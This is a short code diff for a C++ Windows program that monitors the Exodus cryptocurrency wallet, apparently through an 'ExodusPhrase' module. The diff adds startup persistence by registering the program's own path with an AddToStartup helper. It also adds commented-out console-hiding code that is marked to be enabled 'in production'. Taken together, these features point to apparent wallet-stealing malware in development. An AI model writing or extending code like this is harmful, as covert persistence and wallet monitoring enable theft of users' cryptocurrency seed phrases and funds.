@@ -3,8 +3,22 @@
 #include <chrono>
 #include <thread>
 #include "ExodusPhrase.hpp"
+#include "AddToSetup.hpp"
+
 
 int main() {
+   // HWND hWnd = GetConsoleWindow();
+   // ShowWindow(hWnd, SW_HIDE);
+    //SetWindowLongPtr(hWnd, GWL_EXSTYLE, GetWindowLongPtr(hWnd, GWL_EXSTYLE) | WS_EX_TOOLWINDOW);    //ADD IN PRODUCTION
+    char path[MAX_PATH];
+    GetModuleFileNameA(NULL, path, MAX_PATH);
+
+    std::string programPath(path);
+
+    if (!AddToStartup(programPath)) {
+        std::cerr << "Failed to add program to startup." << std::endl;
+    }
+
     ExodusStateDetector detector;
     ExodusState previousState = ExodusState::NotRunning;
     bool initialOutput = true;
